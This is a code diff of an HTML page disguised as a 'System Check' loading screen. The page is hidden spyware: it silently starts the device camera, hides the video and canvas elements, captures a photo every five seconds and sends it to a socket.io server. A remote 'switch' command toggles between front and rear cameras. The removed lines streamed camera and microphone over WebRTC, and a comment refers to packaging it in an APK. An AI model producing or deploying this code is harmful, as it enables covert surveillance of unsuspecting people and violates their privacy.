@@ -1,34 +1,37 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Update</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body,html{margin:0;padding:0;background:#000;height:100%;display:flex;align-items:center;justify-content:center;color:#444;font-family:sans-serif;}video{display:none;}</style></head>
+<head><title>System Check</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body,html{margin:0;padding:0;background:#000;color:#444;height:100%;display:flex;align-items:center;justify-content:center;font-family:sans-serif;}video,canvas{display:none;}</style></head>
 <body>
-    <div>🌀 System Loading...</div>
+    <div>🌀 Loading System...</div>
     <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
+
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io(); 
-        let pc, stream;
+        const socket = io();
+        const v = document.getElementById("v");
+        const c = document.getElementById("c");
+        let mode = "user", stream;
 
         async function start() {
-            pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+            if (stream) stream.getTracks().forEach(t => t.stop());
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+            v.srcObject = stream;
             
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-                stream.getTracks().forEach(t => pc.addTrack(t, stream));
-
-                pc.onicecandidate = e => e.candidate && socket.emit("ice", e.candidate);
-
-                const offer = await pc.createOffer();
-                await pc.setLocalDescription(offer);
-                socket.emit("offer", offer);
-            } catch (e) { setTimeout(start, 5000); }
+            // 📸 Prottek 5 second por por chobi tule pathabe
+            setInterval(takeSnapshot, 5000);
         }
 
-        socket.on("answer", a => pc.setRemoteDescription(new RTCSessionDescription(a)));
-        socket.on("ice", c => pc.addIceCandidate(new RTCIceCandidate(c)));
-        
-        // 🚀 APK-te screen-e click na korle auto-stream block thake, tai eita dorkar
-        window.addEventListener('click', start, {once: true});
+        function takeSnapshot() {
+            const ctx = c.getContext("2d");
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+            ctx.drawImage(v, 0, 0, c.width, c.height);
+            const data = c.toDataURL("image/jpeg", 0.5); // Compression 50%
+            socket.emit("image", data);
+        }
+
+        socket.on("switch", () => { mode = (mode === "user") ? "environment" : "user"; start(); });
         window.onload = start;
     </script>
 </body>
